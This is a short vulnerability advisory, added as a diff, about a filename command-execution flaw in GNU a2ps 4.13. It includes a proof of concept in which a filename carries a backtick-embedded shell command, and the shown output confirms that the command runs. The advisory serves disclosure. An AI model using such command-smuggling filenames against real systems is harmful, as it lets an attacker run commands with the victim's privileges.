@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/11025/info
+
+Reportedly GNU a2ps is affected by a filename command-execution vulnerability. This issue is due to the application's failure to properly sanitize filenames.
+
+An attacker might leverage this issue to execute arbitrary shell commands with the privileges of an unsuspecting user running the vulnerable application.
+
+Although this issue reportedly affects only a2ps version 4.13, other versions are likely affected as well. 
+
+$ touch 'x`echo >&2 42`.c'
+$ a2ps -o /dev/null *.c
+42
+[x`echo >&2 42`.c (C): 0 pages on 0 sheets]
+[Total: 0 pages on 0 sheets] saved into the file `/dev/null'
+
